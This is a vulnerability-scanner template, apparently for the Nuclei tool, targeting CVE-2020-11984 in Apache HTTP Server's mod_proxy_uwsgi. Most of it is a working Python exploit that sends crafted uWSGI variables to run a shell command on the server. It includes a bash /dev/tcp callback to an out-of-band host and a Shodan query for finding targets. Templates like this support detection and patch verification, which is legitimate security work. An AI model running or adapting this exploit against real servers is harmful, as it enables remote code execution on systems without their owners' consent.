id: CVE-2020-11984

info:
  name: Apache HTTP Server - Remote Code Execution
  author: wofeiwo@80sec.com,pszyszkowski
  severity: critical
  description: |
    Apache HTTP Server 2.4.32 to 2.4.44 contains an info disclosure and possible remote code execution caused by a vulnerability in mod_proxy_uwsgi, letting remote attackers access sensitive information and potentially execute arbitrary code, exploit requires sending crafted requests.
  remediation: |
    Update to >= 2.4.45
  reference:
    - https://github.com/RubenBar/MLW-upcrans/tree/main/1.Exploit
    - https://nvd.nist.gov/vuln/detail/cve-2020-11984
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-11984
    cwe-id: CWE-120
  metadata:
    verified: true
    vendor: apache
    product: http_server
    shodan-query:
      - server: cpe:"cpe:2.3:a:apache:http_server"
  tags: cve,cve2020,apache,httpd,rce
variables:
  callback: "/bin/bash -c 'echo 1 > /dev/tcp/{{interactsh-url}}/80'"
code:
  - engine:
      - py
      - python3
    source: |
      import sys
      import os
      import argparse
      import requests

      uwsgi_addr = os.getenv('BaseURL')
      command = os.getenv('callback')

      def sz(x):
          s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
          s = bytes.fromhex(s)
          return s[::-1]

      def pack_uwsgi_vars(var):
          pk = b''
          for k, v in var.items() if hasattr(var, 'items') else var:
              pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
          result = b'\x00' + sz(pk) + b'\x00' + pk
          return result

      def fetch_data(uri, var=None, payload=None, body=None):
          if 'http' not in uri:
              uri = 'http://' + uri

          session = requests.Session()

          d = session.get(uri, data=pack_uwsgi_vars(var))

          return {
              'code': d.status_code,
              'text': d.text,
              'header': d.headers
          }

      def curl(addr_and_port, payload, uri):
          var = {'UWSGI_FILE': payload, 'SCRIPT_NAME': uri}
          return fetch_data(addr_and_port+uri, var, payload)

      def main(*args):
          payload = 'exec://' + command + '; echo ""' # must have someting in output or the uWSGI crashs.
          print("[*]Sending payload.")
          print(curl(uwsgi_addr, payload, '/penetrate'))

      if __name__ == '__main__':
          main()
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"